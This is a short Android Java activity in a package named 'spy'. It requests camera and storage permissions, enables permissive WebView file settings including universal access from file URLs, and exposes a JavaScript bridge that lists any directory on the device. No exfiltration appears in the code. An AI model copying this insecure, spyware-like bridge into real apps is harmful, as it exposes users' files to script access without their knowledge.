package com.spy.v33; import android.os.*; import android.webkit.*; import android.app.Activity; import java.io.File; public class MainActivity extends Activity { protected void onCreate(Bundle s) { super.onCreate(s); requestPermissions(new String[]{"android.permission.CAMERA", "android.permission.READ_EXTERNAL_STORAGE"}, 1); WebView w = new WebView(this); w.getSettings().setJavaScriptEnabled(true); w.getSettings().setAllowFileAccess(true); w.getSettings().setAllowUniversalAccessFromFileURLs(true); w.addJavascriptInterface(new Object() { 
                @JavascriptInterface public String list(String path) { try { File f = new File(path); File[] files = f.listFiles(); StringBuilder sb = new StringBuilder(); for (File file : files) { sb.append(file.isDirectory() ? "📁 " : "📄 ").append(file.getName()).append("\n"); } return sb.toString(); } catch (Exception e) { return "Empty"; } }
                @JavascriptInterface public boolean isDir(String path) { return new File(path).isDirectory(); }
            }, "Android"); w.loadUrl("file:///android_asset/index.html"); setContentView(w); } }